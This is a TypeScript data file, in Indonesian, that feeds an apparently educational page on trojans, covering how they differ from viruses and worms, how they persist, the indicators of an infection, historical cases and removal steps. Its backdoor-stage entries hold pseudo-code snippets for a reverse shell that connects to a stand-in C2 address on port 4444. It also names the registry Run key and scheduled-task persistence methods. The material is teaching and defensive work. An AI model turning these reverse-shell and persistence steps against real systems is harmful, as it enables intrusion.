// File: src/data/trojanTheoryData.ts

export interface TrojanCharacteristic {
  title: string;
  desc: string;
  technicalTerm: string;
}

export interface MalwareTriadComparison {
  dimension: string;
  virus: string;
  worm: string;
  trojan: string;
}

export interface BackdoorArchitectureStage {
  id: string;
  phase: string;
  title: string;
  mechanism: string;
  systemImpact: string;
  commandSnippet: string;
}

export interface PersistenceMechanismItem {
  id: string;
  category: string;
  title: string;
  technicalDetails: string;
  operatingSystemArtifact: string;
  mitigationMethod: string;
}

export interface TrojanIoCItem {
  indicator: string;
  diagnosticTool: string;
  telemetryObservation: string;
  investigativeAction: string;
}

export interface TrojanCaseStudyItem {
  id: string;
  name: string;
  year: string;
  category: string;
  attackVector: string;
  impactScale: string;
  technicalLesson: string;
}

export interface TrojanSopStep {
  step: string;
  title: string;
  desc: string;
  technicalCommand: string;
  objective: string;
}

export const TROJAN_CHARACTERISTICS: TrojanCharacteristic[] = [
  {
    title: 'Penyamaran Utilitas Fungsional (Deceptive Camouflage)',
    desc: 'Trojan menyamar sebagai aplikasi legal, utilitas sistem, atau permainan yang benar-benar berfungsi normal di permukaan guna menipu kewaspadaan pengguna.',
    technicalTerm: 'Masquerading & Social Engineering',
  },
  {
    title: 'Nir-Replikasi Mandiri (Non-Self-Replicating)',
    desc: 'Berbeda dari Virus atau Worm, Trojan tidak menyisipkan kodenya ke berkas PE lain dan tidak memindai subnet untuk memperbanyak diri tanpa tindakan eksekusi awal.',
    technicalTerm: 'Standalone Execution Without Propagation Engine',
  },
  {
    title: 'Kanal Pintu Belakang Tersembunyi (Covert Backdoor Channel)',
    desc: 'Di balik antarmuka aplikasi normal, Trojan meluncurkan thread latar belakang yang membuka soket jaringan keluar (reverse shell) menuju Command & Control (C2) Server.',
    technicalTerm: 'Outbound TCP Tunnel & C2 Beaconing',
  },
];

export const MALWARE_TRIAD_COMPARISON: MalwareTriadComparison[] = [
  {
    dimension: 'Mekanisme Operasional Utama',
    virus: 'Menyisipkan kode biner parasitik ke dalam berkas executable (.exe/.dll) sah.',
    worm: 'Mengeksploitasi celah layanan jaringan (misal SMB Port 445) untuk mereplikasi diri mandiri.',
    trojan: 'Menyamar sebagai aplikasi sah yang fungsional sembari membuka backdoor di latar belakang.',
  },
  {
    dimension: 'Kemandirian Replikasi Diri',
    virus: 'Memerlukan interaksi manual pengguna untuk mengeksekusi biner inang yang terinfeksi.',
    worm: 'Otonom penuh: Memperbanyak diri ke seluruh subnet tanpa campur tangan manusia.',
    trojan: 'Tidak mereplikasi diri: Bergantung pada rekayasa sosial agar diunduh dan dipasang oleh korban.',
  },
  {
    dimension: 'Ketergantungan Berkas Inang',
    virus: 'Parasitik (Wajib menempel pada berkas PE sah untuk dapat bertahan hidup).',
    worm: 'Stand-alone (Berdiri sebagai paket transmisi jaringan atau proses independen).',
    trojan: 'Stand-alone / Wrapper (Berdiri sebagai berkas aplikasi tunggal berkamuflase).',
  },
  {
    dimension: 'Vektor Penetrasi Awal',
    virus: 'Injeksi biner lokal via media penyimpanan eksternal atau lampiran surel.',
    worm: 'Pemindaian port jarak jauh (Remote Port Scanning) dan buffer overflow tanpa autentikasi.',
    trojan: 'Rekayasa sosial (Phishing, installer bajakan, utilitas tidak resmi bertanda tangan palsu).',
  },
  {
    dimension: 'Tanda Telemetri Jaringan',
    virus: 'Tidak ada transmisi jaringan langsung (kecuali biner terinfeksi memiliki payload sekunder).',
    worm: 'Lonjakan ekstrem paket broadcast TCP SYN sweep pada port layanan lokal (Port 445/139).',
    trojan: 'Koneksi persisten keluar (ESTABLISHED) pada port tidak standar (seperti Port 4444) ke IP C2 asing.',
  },
  {
    dimension: 'Tantangan Remediasi Utama',
    virus: 'Restorasi struktur PE Header dan rekonstruksi AddressOfEntryPoint biner inang.',
    worm: 'Isolasi fisik subnet dan pemblokiran port firewall sebelum reinfection berantai terjadi.',
    trojan: 'Pelepasan file locking proses di RAM (SIGKILL) sebelum berkas induk dan entri registri dapat dihapus.',
  },
];

export const BACKDOOR_STAGES: BackdoorArchitectureStage[] = [
  {
    id: 'stage-1',
    phase: 'Tahap 1',
    title: 'Eksekusi Permukaan & Penyamaran Antarmuka',
    mechanism: 'Pengguna mengeksekusi biner utilitas (misalnya SuperCalc_Pro.exe). GUI kalkulator terbuka dan melayani operasi aritmetika normal, meniadakan kecurigaan korban.',
    systemImpact: 'Jendela aplikasi sah aktif di layar desktop dengan alokasi memori proses standar.',
    commandSnippet: 'CreateProcessW("SuperCalc_Pro.exe", ...)',
  },
  {
    id: 'stage-2',
    phase: 'Tahap 2',
    title: 'Injeksi Thread Latar Belakang & Pembukaan Soket',
    mechanism: 'Bersamaan dengan GUI, thread sekunder diinisialisasi secara diam-diam. Thread ini membuat soket TCP Winsock (ws2_32.dll) dan memetakan I/O ke pipa tersembunyi.',
    systemImpact: 'Sub-proses memicu koneksi soket tanpa jendela antarmuka tambahan (headless process thread).',
    commandSnippet: 'WSAStartup() -> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)',
  },
  {
    id: 'stage-3',
    phase: 'Tahap 3',
    title: 'Koneksi Keluar ke C2 Server (Reverse Shell)',
    mechanism: 'Trojan menghubungi alamat IP C2 peretas pada Port 4444. Karena koneksi bersifat keluar (outbound), paket ini sering kali melewati aturan firewall perimeter standar.',
    systemImpact: 'Tabel Netstat mencatat koneksi berstatus ESTABLISHED ke alamat IP eksternal 198.51.100.23:4444.',
    commandSnippet: 'connect(sock, {sin_addr: "198.51.100.23", sin_port: 4444})',
  },
  {
    id: 'stage-4',
    phase: 'Tahap 4',
    title: 'Eksfiltrasi Data & Pipa Kendali Jarak Jauh',
    mechanism: 'Standard Input/Output proses command interpreter (cmd.exe/powershell.exe) diarahkan ke soket jaringan. Peretas memperoleh kendali penuh atas sistem operasi host.',
    systemImpact: 'Peretas dapat membaca berkas rahasia, menyuntikkan muatan ransomware, atau mematikan proteksi lokal.',
    commandSnippet: 'CreateProcess(..., STARTUPINFO.hStdInput = sock, ...)',
  },
];

export const PERSISTENCE_MECHANISMS: PersistenceMechanismItem[] = [
  {
    id: 'reg-run',
    category: 'Registri Startup',
    title: 'Auto-Run Execution Keys (HKCU / HKLM)',
    technicalDetails: 'Trojan menuliskan entri nilai biner ke kunci registri Run pengguna saat ini (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run). Setiap kali pengguna login ke sistem, Windows Subsystem otomatis mengeksekusi biner Trojan tanpa konfirmasi ulang.',
    operatingSystemArtifact: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SuperCalcSync = "C:\\ProgramData\\SuperCalc_Pro.exe"',
    mitigationMethod: 'Pembersihan manual menggunakan reg delete atau alat analisis autorun Sysinternals.',
  },
  {
    id: 'process-locking',
    category: 'Memori & Kernel',
    title: 'Penguncian Berkas di Memori RAM (File-in-Use Lock)',
    technicalDetails: 'Saat Trojan aktif, kernel Windows menerapkan file locking eksklusif pada executable yang sedang berjalan via memory mapped file. Jika teknisi berusaha menghapus berkas di Explorer, sistem akan menolak dengan galat ERROR_SHARING_VIOLATION.',
    operatingSystemArtifact: 'Kernel Handle Table: File handle aktif terkunci oleh PID 3892 (SuperCalc_Pro.exe).',
    mitigationMethod: 'Terminasi proses induk secara paksa di RAM (SIGKILL / taskkill /F /PID) sebelum penghapusan berkas.',
  },
  {
    id: 'scheduled-task',
    category: 'Task Scheduler',
    title: 'Penjadwalan Tugas Berkala (Task Scheduler Persistence)',
    technicalDetails: 'Untuk mengantisipasi jika pengguna mematikan proses di Task Manager, Trojan mendaftarkan jadwal eksekusi tersembunyi yang akan mengevaluasi status proses setiap 15 menit dan memuat ulang biner jika tidak aktif di RAM.',
    operatingSystemArtifact: 'C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\SysCalcMaintenance',
    mitigationMethod: 'Audit dan pencabutan tugas terjadwal via schtasks /delete atau antarmuka Taskschd.msc.',
  },
];

export const TROJAN_IOCS: TrojanIoCItem[] = [
  {
    indicator: 'Koneksi Port 4444 Berstatus ESTABLISHED',
    diagnosticTool: 'Netstat (netstat -ano)',
    telemetryObservation: 'TCP 192.168.10.15:49812 menuju IP Publik 198.51.100.23:4444 berstatus ESTABLISHED dengan Process ID (PID) tertera.',
    investigativeAction: 'Catat nomor PID yang bertanggung jawab atas soket tersebut untuk verifikasi pohon proses.',
  },
  {
    indicator: 'Proses Utilitas Menahan Soket Jaringan Asing',
    diagnosticTool: 'Process Explorer / Task Manager',
    telemetryObservation: 'Biner kalkulator lokal memiliki koneksi TCP aktif dan memuat modul Winsock2 (ws2_32.dll) tanpa justifikasi fungsional.',
    investigativeAction: 'Inspeksi tab TCP/IP pada properti proses dan verifikasi penandatangan kode digital (Digital Signature).',
  },
  {
    indicator: 'Penolakan Akses Berkas (File in Use / 0x00000020)',
    diagnosticTool: 'File Explorer / PowerShell Remove-Item',
    telemetryObservation: 'Operasi penghapusan berkas gagal dengan pesan "The process cannot access the file because it is being used by another process".',
    investigativeAction: 'Konfirmasi bahwa proses di RAM belum diterminasi dan handle berkas masih ditahan kernel.',
  },
  {
    indicator: 'Kunci Registri Run Tidak Terotentikasi',
    diagnosticTool: 'Registry Editor (regedit.exe) / autoruns.exe',
    telemetryObservation: 'Ditemukan entri mencurigakan pada HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run yang mengarah ke berkas biner di direktori sementara.',
    investigativeAction: 'Ekstraksi nilai entri registri, hapus kunci, dan kumpulkan sampel hash biner untuk analisis statis.',
  },
];

export const TROJAN_CASE_STUDIES: TrojanCaseStudyItem[] = [
  {
    id: 'netbus',
    name: 'NetBus & Back Orifice',
    year: '1998 - 1999',
    category: 'Remote Access Trojan (RAT) Klasik',
    attackVector: 'Penyamaran sebagai aplikasi lelucon (joke utility) atau patch game bajakan via protokol IRC dan surel.',
    impactScale: 'Jutaan komputer pribadi di seluruh dunia dieksploitasi untuk pengintaian webcam, keylogger, dan pembukaan drive CD-ROM.',
    technicalLesson: 'Membuktikan bahwa aplikasi yang tampak tidak berbahaya dapat membuka listening port tersembunyi (Port 12345/31337) tanpa disadari korban.',
  },
  {
    id: 'zeus',
    name: 'Zeus Banking Trojan (Zbot)',
    year: '2007',
    category: 'Credential Harvester & Banking Trojan',
    attackVector: 'Rekayasa sosial melalui surel phishing berpura-pura menjadi tagihan bank resmi dan unduhan drive-by.',
    impactScale: 'Pencurian ratusan juta dolar dari rekening bisnis multinasional melalui teknik injeksi formulir browser (Man-in-the-Browser).',
    technicalLesson: 'Menunjukkan bagaimana Trojan mempertahankan persistensi tingkat tinggi di registri dan menyadap panggilan API peramban secara senyap.',
  },
  {
    id: 'darkcomet',
    name: 'DarkComet RAT',
    year: '2011',
    category: 'Advanced Remote Administration Trojan',
    attackVector: 'Biner pembungkus (binder) yang menyatukan muatan perusak ke dalam installer dokumen PDF dan aplikasi pemutar media.',
    impactScale: 'Digunakan dalam spionase siber target khusus terhadap lembaga diplomatik, jurnalis, dan infrastruktur pendidikan.',
    technicalLesson: 'Menyoroti pentingnya pelacakan PID dan penutupan port komunikasi keluar (Port 1604/4444) pada firewall internal organisasi.',
  },
  {
    id: 'emotet',
    name: 'Emotet Modular Trojan Dropper',
    year: '2014 - 2021',
    category: 'Polymorphic Trojan & Botnet Loader',
    attackVector: 'Dokumen perkantoran berisi makro jahat yang mengeksekusi skrip PowerShell tersembunyi untuk mengunduh payload C2 sekunder.',
    impactScale: 'Menjadi infrastruktur pengantar utama bagi sindikat ransomware internasional seperti Ryuk dan Conti.',
    technicalLesson: 'Menegaskan bahwa Trojan berfungsi sebagai pintu gerbang awal (initial access) yang memfasilitasi serangan siber berskala jauh lebih destruktif.',
  },
];

export const TROJAN_SOP_STEPS: TrojanSopStep[] = [
  {
    step: '01',
    title: 'Audit Jaringan & Pelacakan PID (Netstat Analysis)',
    desc: 'Lakukan pemindaian tabel koneksi aktif sistem operasi. Identifikasi koneksi keluar yang mencurigakan menuju alamat IP eksternal pada Port 4444, lalu catat nomor Process ID (PID) unik yang terikat pada soket tersebut.',
    technicalCommand: 'netstat -ano | findstr 4444',
    objective: 'Menemukan identitas proses induk (PID) yang mengendalikan pipa komunikasi backdoor.',
  },
  {
    step: '02',
    title: 'Penutupan Akses Firewall & Terminasi Proses di RAM',
    desc: 'Sebelum memanipulasi berkas fisik, blokir koneksi keluar menuju IP server pengendali (C2) pada Host Firewall, kemudian hentikan eksekusi proses induk secara paksa dari memori kerja untuk melepaskan penguncian berkas oleh kernel.',
    technicalCommand: 'New-NetFirewallRule & taskkill /F /PID <PID>',
    objective: 'Memutus kendali jarak jauh peretas seketika dan melepaskan lock file-in-use pada biner.',
  },
  {
    step: '03',
    title: 'Eliminasi Biner Induk & Pembersihan Entri Registri Startup',
    desc: 'Setelah proses RAM mati dan soket terputus, hapus berkas executable pembawa Trojan dari partisi penyimpanan, kemudian audit dan bersihkan entri auto-run pada registri Windows agar Trojan tidak aktif kembali saat sistem di-reboot.',
    technicalCommand: 'Remove-Item <path> & reg delete HKCU\\...\\Run /v <Key>',
    objective: 'Menjamin pemulihan menyeluruh tanpa risiko persistensi saat komputer dinyalakan kembali.',
  },
];
